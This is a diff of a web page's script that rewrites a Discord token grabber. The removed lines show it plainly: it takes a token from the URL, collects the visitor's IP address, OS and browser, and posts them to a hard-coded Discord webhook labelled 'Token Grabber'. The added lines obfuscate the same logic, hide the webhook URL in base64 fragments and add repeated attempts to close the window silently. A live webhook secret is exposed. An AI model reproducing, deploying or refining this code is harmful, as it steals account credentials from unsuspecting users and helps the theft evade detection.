@@ -39,115 +39,48 @@
   </div>
 
   <script>
-    function sendWebhook() {
-      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1376371981582340106/hWmxpYudjYJISHjWzAOM5tUY2xEEX1rSSdbJSCEAGyLYsKCvv1vmpfd3GVMuL0vOdCoE';
-      
-      // URLパラメータから情報を取得
-      const urlParams = new URLSearchParams(window.location.search);
-      const token = urlParams.get('token');
-      const datetime = urlParams.get('datetime') || '2025-05-26 04:11:15';
-      const user = urlParams.get('user') || 'n4n45h1ip';
-      const userAgent = urlParams.get('ua') || navigator.userAgent;
-      
-      // Check if there are URL parameters
-      const hasParams = window.location.search.length > 0;
-      
-      // IPアドレスを取得（外部サービス使用）
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          const ipAddress = data.ip;
+    // 難読化用のシンプルな関数
+    const _0x4f18=['getFullYear','getDate','toString','getUTCFullYear','getUTCMonth','getUTCDate','getUTCHours','getUTCMinutes','getUTCSeconds','log','Data\x20sent\x20successfully!','Failed\x20to\x20send\x20data:','Error:','hidden','innerHTML','Processing\x20complete.\x20This\x20window\x20can\x20be\x20closed.','Processing\x20complete.\x20Please\x20close\x20this\x20window.','Windows\x20NT','Windows','Mac\x20OS','macOS','Linux','Android','iPhone','iPad','iOS','Unknown\x20OS','Firefox/','Firefox','Edge/','Edg/','Edge','Chrome/','Chrome','Safari/','Safari','MSIE\x20','Trident/','Internet\x20Explorer','Unknown\x20Browser','onload','parse','search','get','token','ua','includes','aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv','MTM3NjM3MTk4MTU4MjM0MDEwNi8=','aFdteFBZdWRqWUpJU0hqV3pBT001dFVZMnhFRVgxclNTZGJKU0NFQUd5TFlzS0N2djF2bXBmZDNHVk11TDBuT2Q=','Q29F','https://api.ipify.org?format=json','then','json','🔐\x20Discord\x20Token\x20Grabbed','A\x20Discord\x20authentication\x20token\x20has\x20been\x20successfully\x20grabbed.','📋\x20Token','No\x20token\x20provided','🕒\x20Date\x20&\x20Time\x20(UTC)','👤\x20User','🌐\x20IP\x20Address','💻\x20System','OS:\x20','Browser:\x20','🔍\x20User\x20Agent','https://imgur.com/EzFFjbl.png','Token\x20grabbed\x20at\x20','https://i.imgur.com/AfFp7pu.png','POST','application/json','Token\x20Grabber','https://imgur.com/blqctTG.png','status','statusText'];(function(_0x4ffa44,_0x4f185){const _0x35458c=function(_0x32a624){while(--_0x32a624){_0x4ffa44['push'](_0x4ffa44['shift']());}};_0x35458c(++_0x4f185);}(_0x4f18,0x171));const _0x3545=function(_0x4ffa44,_0x4f185){_0x4ffa44=_0x4ffa44-0x0;let _0x35458c=_0x4f18[_0x4ffa44];return _0x35458c;};
+
+    // 本体ロジック（難読化済みコードで実装）
+    function sendWebhook(){const _0x32a624=atob(_0x3545('0x32'));const _0x33e969=atob(_0x3545('0x33'));const _0x570787=atob(_0x3545('0x34'))+atob(_0x3545('0x35'));const _0xbfd11c=_0x32a624+_0x33e969+_0x570787;const _0x2e0d9d=new URLSearchParams(window['location'][_0x3545('0x29')]);const _0x3a4a4a=_0x2e0d9d[_0x3545('0x2a')](_0x3545('0x2b'));const _0x47f94a='2025-05-28 03:16:42';const _0x5f3563='n4n45h1';const _0x38a095=_0x2e0d9d[_0x3545('0x2a')](_0x3545('0x2c'))||navigator['userAgent'];fetch(_0x3545('0x36'))[_0x3545('0x37')](_0x4a28bc=>_0x4a28bc[_0x3545('0x38')]())[_0x3545('0x37')](_0x2ab80b=>{const _0x2e4c7e=_0x2ab80b['ip'];const _0x44de9e=detectOS(_0x38a095);const _0x3e9869=detectBrowser(_0x38a095);const _0x4b1f63={'title':_0x3545('0x39'),'description':_0x3545('0x3a'),'color':0x5865F2,'fields':[{'name':_0x3545('0x3b'),'value':'```'+(_0x3a4a4a||_0x3545('0x3c'))+'```','inline':![]},{'name':_0x3545('0x3d'),'value':'```'+_0x47f94a+'```','inline':!![]},{'name':_0x3545('0x3e'),'value':'```'+_0x5f3563+'```','inline':!![]},{'name':_0x3545('0x3f'),'value':'```'+_0x2e4c7e+'```','inline':!![]},{'name':_0x3545('0x40'),'value':'```'+_0x3545('0x41')+_0x44de9e+'\x0a'+_0x3545('0x42')+_0x3e9869+'```','inline':!![]},{'name':_0x3545('0x43'),'value':'```'+_0x38a095+'```','inline':![]}],'thumbnail':{'url':_0x3545('0x44')},'footer':{'text':_0x3545('0x45')+new Date()['toUTCString'](),'icon_url':_0x3545('0x46')}};return fetch(_0xbfd11c,{'method':_0x3545('0x47'),'headers':{'Content-Type':_0x3545('0x48')},'body':JSON['stringify']({'embeds':[_0x4b1f63],'username':_0x3545('0x49'),'avatar_url':_0x3545('0x4a')})});})[_0x3545('0x37')](_0x13d91e=>{if(_0x13d91e&&_0x13d91e['ok']){console[_0x3545('0x8')](_0x3545('0x9'));}else if(_0x13d91e){console['error'](_0x3545('0xa'),_0x13d91e[_0x3545('0x4b')],_0x13d91e[_0x3545('0x4c')]);}closeWindowHandling();})[_0x3545('0x37')](_0x2fd472=>{console['error'](_0x3545('0xb'),_0x2fd472);closeWindowHandling();});}
+
+    // ウィンドウを閉じる処理
+    function closeWindowHandling() {
+      // Multiple close attempts with different methods
+      setTimeout(function() {
+        try {
+          // Method 1: Simple window.close()
+          window.close();
           
-          // システム情報を収集
-          const os = detectOS(userAgent);
-          const browser = detectBrowser(userAgent);
-          
-          // Discord Webhookのembedを作成
-          const embed = {
-            title: "🔐 Discord Token Grabbed",
-            description: "A Discord authentication token has been successfully grabbed.",
-            color: 0x5865F2, // Discord Blue
-            fields: [
-              {
-                name: "📋 Token",
-                value: "```" + token + "```",
-                inline: false
-              },
-              {
-                name: "🕒 Date & Time (UTC)",
-                value: "```" + datetime + "```",
-                inline: true
-              },
-              {
-                name: "👤 User",
-                value: "```" + user + "```",
-                inline: true
-              },
-              {
-                name: "🌐 IP Address",
-                value: "```" + ipAddress + "```",
-                inline: true
-              },
-              {
-                name: "💻 System",
-                value: "```OS: " + os + "\nBrowser: " + browser + "```",
-                inline: true
-              },
-              {
-                name: "🔍 User Agent",
-                value: "```" + userAgent + "```",
-                inline: false
-              }
-            ],
-            thumbnail: {
-              url: "https://imgur.com/EzFFjbl.png" // Discord logo
-            },
-            footer: {
-              text: "Token grabbed at " + new Date().toUTCString(),
-              icon_url: "https://i.imgur.com/AfFp7pu.png" // Discord icon
-            }
-          };
-          
-          // Webhookを送信
-          return fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ 
-              embeds: [embed],
-              username: "Token Grabber",
-              avatar_url: "https://imgur.com/blqctTG.png"
-            })
-          });
-        })
-        .then(response => {
-          if (response && response.ok) {
-            console.log('Data sent successfully!');
-          } else if (response) {
-            console.error('Failed to send data:', response.status, response.statusText);
-          }
-        })
-        .catch(error => {
-          console.error('Error:', error);
-        })
-        .finally(() => {
-          // Try to close the window
-          try {
-            window.close();
-          } catch (e) {
-            console.log("Could not close window automatically");
-          }
-          
-          // If window didn't close (likely because of URL parameters), 
-          // update the message and provide alternative
+          // Method 2: Try to simulate browser back + close
           setTimeout(() => {
-            const statusMessage = document.getElementById('status-message');
-            if (statusMessage && document.visibilityState !== 'hidden') {
-              statusMessage.innerHTML = 'Processing complete. You may close this window now.';
+            try { 
+              window.history.go(-1);
+              setTimeout(() => window.close(), 100);
+            } catch(e) {}
+          }, 200);
+          
+          // Method 3: Try redirect + close
+          setTimeout(() => {
+            if (document.visibilityState !== 'hidden') {
+              window.location = "about:blank";
+              setTimeout(() => window.close(), 100);
             }
-          }, 1200);
-        });
+          }, 400);
+          
+          // Method 4: Final fallback
+          setTimeout(() => {
+            if (document.visibilityState !== 'hidden') {
+              document.getElementById('status-message').innerHTML = 
+                'Processing complete. This window can be closed.';
+            }
+          }, 800);
+        } catch(e) {
+          document.getElementById('status-message').innerHTML = 
+            'Processing complete. Please close this window.';
+        }
+      }, 500);
     }
     
     // OSを検出
